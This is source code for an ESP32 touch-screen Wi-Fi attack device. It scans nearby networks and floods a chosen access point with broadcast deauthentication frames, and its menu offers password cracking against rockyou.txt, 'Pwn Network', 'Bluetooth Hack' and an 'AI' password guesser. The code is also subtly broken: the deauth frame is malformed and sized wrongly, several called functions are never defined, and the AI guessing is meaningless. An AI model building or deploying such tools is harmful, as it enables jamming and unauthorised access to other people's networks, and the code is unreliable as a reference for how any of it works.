#include <TFT_eSPI.h>
#include <WiFi.h>
#include <SD.h>
#include <ArduinoJson.h>
#include <WiFiManager.h>
#include <TaskScheduler.h>
#include <pthread.h>
#include <atomic>
#include <mutex>
#include <BluetoothSerial.h>
#include <TensorFlowLite.h>
#include <tensorflow/lite/micro/all_ops_resolver.h>
#include <tensorflow/lite/schema/schema_generated.h>
#include <tensorflow/lite/micro/micro_interpreter.h>
#include <tensorflow/lite/version.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <esp_heap_caps.h>

// Define file paths
#define ROCKYOU_PATH "/rockyou.txt"
#define SETTINGS_PATH "/settings.json"
#define CHECKPOINT_PATH "/checkpoint.txt"

// Calibration values for the touch screen
#define TS_MINX 100
#define TS_MINY 100
#define TS_MAXX 920
#define TS_MAXY 940

// Define touch screen sensitivity
#define MINPRESSURE 10
#define MAXPRESSURE 1000

// TFT setup
TFT_eSPI tft = TFT_eSPI();  // Invoke custom library

// Bluetooth setup
BluetoothSerial SerialBT;

// TensorFlow Lite Micro Setup (lazy initialization)
bool tfLiteInitialized = false;
const int kTensorArenaSize = 4 * 1024; // Adjust size based on actual model size
uint8_t tensor_arena[kTensorArenaSize];

// Placeholders for TensorFlow Lite Micro interpreter and model
tflite::MicroInterpreter *interpreter = nullptr;
tflite::AllOpsResolver resolver;
tflite::ErrorReporter *error_reporter = nullptr;
const tflite::Model *model = nullptr;
TfLiteTensor *input = nullptr;
TfLiteTensor *output = nullptr;

// Struct to hold network information
struct NetworkInfo {
  char ssid[50];
  char bssid[18];
  int rssi;
  int channel;
  bool has_password;
  bool pmf_enabled;
  char password[64];
};

// Global variables
std::vector<NetworkInfo> networks;
NetworkInfo selectedNetwork;
std::atomic_long bytesRead(0);
std::atomic_bool foundPassword(false);
std::mutex progressMutex;

// Deauth packet buffer
uint8_t *deauthPacket = nullptr;

WiFiManager wifiManager;
Scheduler tscheduler;
Task tScanNetworks(0, TASK_ONCE, &scanNetworks, &tscheduler, false);
Task tUpdateBatteryStatus(60000, TASK_FOREVER, &updateBatteryStatus, &tscheduler, true);
Task tCrackPassword(0, TASK_ONCE, NULL, &tscheduler, false); // Will be activated manually

// Memory Monitoring Functions
void printMemoryUsage() {
  Serial.printf("Free heap: %d bytes\n", ESP.getFreeHeap());
  Serial.printf("Largest free block: %d bytes\n", ESP.getMaxAllocHeap());

  #ifdef BOARD_HAS_PSRAM
  Serial.printf("Free PSRAM: %d bytes\n", ESP.getFreePsram());
  #endif
  
  Serial.printf("Total free DRAM: %d bytes\n", heap_caps_get_free_size(MALLOC_CAP_8BIT));
  Serial.printf("Free DMA-capable memory: %d bytes\n", heap_caps_get_free_size(MALLOC_CAP_DMA));

  TaskHandle_t taskHandle = xTaskGetCurrentTaskHandle();
  Serial.printf("Stack High Water Mark: %d\n", uxTaskGetStackHighWaterMark(taskHandle));
}

// Function to monitor task stack usage and issue warnings
void monitorTaskStackUsage(TaskHandle_t taskHandle) {
  UBaseType_t stackHighWaterMark = uxTaskGetStackHighWaterMark(taskHandle);
  if (stackHighWaterMark < 50) {  // Threshold to detect low stack space
    Serial.printf("Warning: Task %s is close to stack overflow! High water mark: %d\n",
                  pcTaskGetTaskName(taskHandle), stackHighWaterMark);
  }
}

// Task to monitor memory periodically
void monitorMemoryTaskCallback() {
  Serial.println("Monitoring memory...");
  printMemoryUsage();
  monitorTaskStackUsage(xTaskGetCurrentTaskHandle());
}

Task tMonitorMemory(10000, TASK_FOREVER, &monitorMemoryTaskCallback); // Every 10 seconds

// Optimized TensorFlow Lite AI Password Generation Function
String generateAIpasswordGuess(const String &ssid, const String &bssid) {
  if (!tfLiteInitialized) {
    setupTensorFlowLite();  // Lazy initialization
  }

  if (!interpreter || !input) {
    tft.println("AI model not initialized!");
    return "";
  }

  // Assume a simple input pattern for the model: [ssid_length, bssid_length]
  input->data.f[0] = ssid.length();
  input->data.f[1] = bssid.length();

  // Invoke the AI model
  TfLiteStatus invoke_status = interpreter->Invoke();
  if (invoke_status != kTfLiteOk) {
    tft.println("Error invoking TensorFlow Lite!");
    return "";
  }

  // Get the output from the model
  float predictedPassword = output->data.f[0];

  return ssid + String((int)predictedPassword);
}

// Lazy-initialized TensorFlow Lite Setup Function
void setupTensorFlowLite() {
  if (tfLiteInitialized) return; // Avoid re-initialization

  // Load the TensorFlow Lite model into memory
  model = tflite::GetModel(your_model_data); // Replace with actual model data

  if (model->version() != TFLITE_SCHEMA_VERSION) {
    Serial.println("Model provided is schema version not compatible!");
    return;
  }

  static tflite::MicroInterpreter static_interpreter(
      model, resolver, tensor_arena, kTensorArenaSize, error_reporter);
  interpreter = &static_interpreter;

  TfLiteStatus allocate_status = interpreter->AllocateTensors();
  if (allocate_status != kTfLiteOk) {
    Serial.println("AllocateTensors() failed");
    return;
  }

  input = interpreter->input(0);
  output = interpreter->output(0);

  tfLiteInitialized = true;  // Mark as initialized
  Serial.println("TensorFlow Lite Micro initialized.");
}

// Set the client and AP MAC addresses in the deauth packet
void setClientAddress(const uint8_t *clientMAC) {
  memcpy(&deauthPacket[4], clientMAC, 6);
}

void setAPAddress(const uint8_t *apMAC) {
  memcpy(&deauthPacket[10], apMAC, 6); // Set source address (AP)
  memcpy(&deauthPacket[16], apMAC, 6); // Set BSSID (AP)
}

// Function to send deauth packet
void sendDeauthPacket() {
  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
  Serial.println("Deauth packet sent.");
}

// WPA2 Deauthentication attack function
void deauthWPA2(const uint8_t *apMAC, const uint8_t *clientMAC, int count) {
  // Set the AP and client addresses in the packet
  setAPAddress(apMAC);
  setClientAddress(clientMAC);

  // Use TaskScheduler instead of blocking delay
  for (int i = 0; i < count; i++) {
    sendDeauthPacket();
    tscheduler.delay(100);  // Non-blocking delay for better performance
  }

  Serial.printf("Deauth WPA2 attack completed: %d packets sent.\n", count);
}

// WPA3 Handling: Check for PMF (Protected Management Frames)
bool isPMFEnabled(const NetworkInfo& network) {
  return network.pmf_enabled; // Check if PMF is enabled in the network info
}

// Function to handle WPA3 deauthentication attack
void deauthWPA3(const uint8_t *apMAC, const uint8_t *clientMAC) {
  if (isPMFEnabled(selectedNetwork)) {
    tft.println("Cannot deauth WPA3: PMF is enabled.");
    Serial.println("Cannot perform deauth attack on WPA3 network: PMF is enabled.");
  } else {
    deauthWPA2(apMAC, clientMAC, 100);  // Fallback to WPA2-style attack
  }
}

// Attempt to deauth the selected network (handles both WPA2 and WPA3)
void deauthNetwork() {
  if (strlen(selectedNetwork.ssid) > 0) {  // Check if a network is selected
    uint8_t apMAC[6];
    uint8_t clientMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast MAC

    // Convert BSSID string to MAC address
    sscanf(selectedNetwork.bssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &apMAC[0], &apMAC[1], &apMAC[2], &apMAC[3], &apMAC[4], &apMAC[5]);

    if (selectedNetwork.pmf_enabled) {
      // WPA3 or WPA2 with PMF enabled

      deauthWPA3(apMAC, clientMAC);
    } else {
      // WPA2 without PMF
      deauthWPA2(apMAC, clientMAC, 100);  // Send 100 deauth packets
    }
  } else {
    tft.println("No network selected.");
    Serial.println("No network selected for deauth attack.");
  }
}

// Network Scanning Function with User Interface and memory optimization
void scanNetworks() {
  // Clear networks vector to avoid memory leaks
  networks.clear();
  int numNetworks = WiFi.scanNetworks();
  if (numNetworks == 0) {
    tft.println("No networks found.");
  } else {
    // Use a single buffer to reduce memory fragmentation
    networks.reserve(numNetworks);
    for (int i = 0; i < numNetworks; ++i) {
      NetworkInfo net;
      strncpy(net.ssid, WiFi.SSID(i).c_str(), sizeof(net.ssid) - 1);  // Copy SSID safely
      strncpy(net.bssid, WiFi.BSSIDstr(i).c_str(), sizeof(net.bssid) - 1);  // Copy BSSID safely
      net.rssi = WiFi.RSSI(i);
      net.channel = WiFi.channel(i);
      net.has_password = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
      net.pmf_enabled = WiFi.iswpa3(i);  // Check if the network supports WPA3 with PMF
      networks.push_back(net);
    }
    displayScannedNetworks();
  }
}

// Display Scanned Networks Function with better resource management
void displayScannedNetworks() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);

  for (int i = 0; i < networks.size(); ++i) {
    String ssidDisplay = (strlen(networks[i].ssid) > 12) ? String(networks[i].ssid).substring(0, 12) + "..." : String(networks[i].ssid);
    tft.setCursor(0, i * 20);
    tft.printf("%d. %s  RSSI: %d dBm  PMF: %s\n", i + 1, ssidDisplay.c_str(), networks[i].rssi, networks[i].pmf_enabled ? "Yes" : "No");
  }

  tft.setCursor(0, (networks.size() + 1) * 20);
  tft.setTextSize(1);
  tft.println("Touch to select a network.");
}

// Function to handle network selection from the scanned list
void selectNetwork() {
  uint16_t x, y;
  if (tft.getTouch(&x, &y)) {
    // Determine which network is selected based on Y position
    int index = y / 20;  // Assuming each network occupies 20 pixels in height
    if (index < networks.size()) {
      selectedNetwork = networks[index];
      displayNetworkInfo(selectedNetwork);
      tft.println("Network selected.");
    } else {
      tft.println("Invalid selection.");
    }
  }
}

// Display detailed info of the selected network
void displayNetworkInfo(const NetworkInfo& network) {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(0, 0);
  tft.printf("SSID: %s\n", network.ssid);
  tft.printf("BSSID: %s\n", network.bssid);
  tft.printf("RSSI: %d dBm\n", network.rssi);
  tft.printf("Channel: %d\n", network.channel);
  tft.printf("Secured: %s\n", network.has_password ? "Yes" : "No");
  tft.printf("PMF: %s\n", network.pmf_enabled ? "Enabled" : "Disabled");
}

// Show detailed info of the selected network
void showNetworkInfo() {
  if (strlen(selectedNetwork.ssid) > 0) {
    displayNetworkInfo(selectedNetwork);
  } else {
    tft.println("No network selected.");
  }
}

// Improved processTouch function to handle multiple touch areas
void processTouch() {
  uint16_t x, y;
  if (tft.getTouch(&x, &y)) {
    if (y >= 0 && y < 40) {
      // Scan Networks
      if (x >= 0 && x < 80) {
        tScanNetworks.enable();
      }
      // Select Network
      else if (x >= 80 && x < 160) {
        selectNetwork();
      }
      // Show Network Info
      else if (x >= 160 && x < 240) {
        showNetworkInfo();
      }
      // Pwn Network
      else if (x >= 240 && x < 320) {
        pwnNetwork();
      }
    } else if (y >= 40 && y < 80) {
      // Crack Password
      if (x >= 0 && x < 80) {
        crackNetworkPassword();
      }
      // Deauth Network
      else if (x >= 80 && x < 160) {
        deauthNetwork();
      }
      // Settings Menu
      else if (x >= 160 && x < 240) {
        displaySettingsMenu();
      }
      // Bluetooth Hack
      else if (x >= 240 && x < 320) {
        scanBluetoothDevices();
      }
    }
  }
}

// Main setup function
void setup() {
  Serial.begin(115200);
  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE);

  setupFirmware();
  setupTensorFlowLite();  // Initialize TensorFlow Lite Micro

  // Allocate deauth packet in PSRAM if available, otherwise use internal RAM
  #ifdef BOARD_HAS_PSRAM
  deauthPacket = (uint8_t *)ps_malloc(26);
  #else
  deauthPacket = (uint8_t *)malloc(26);
  #endif

  if (!deauthPacket) {
    Serial.println("Failed to allocate memory for deauth packet.");
    return;
  }
  memset(deauthPacket, 0, 26);  // Initialize packet to zero

  // Initialize and monitor memory task
  tscheduler.addTask(tScanNetworks);
  tscheduler.addTask(tMonitorMemory);  // Memory monitoring task
  tMonitorMemory.enable();

  unitTest_scanNetworks();  // Run unit test for network scanning
}

// Main loop function
void loop() {
  tscheduler.execute();
  delay(5);  // Adjust for timing, avoid watchdog timer reset
  processTouch();
  printMemoryUsage();  // Optional, for real-time monitoring
}
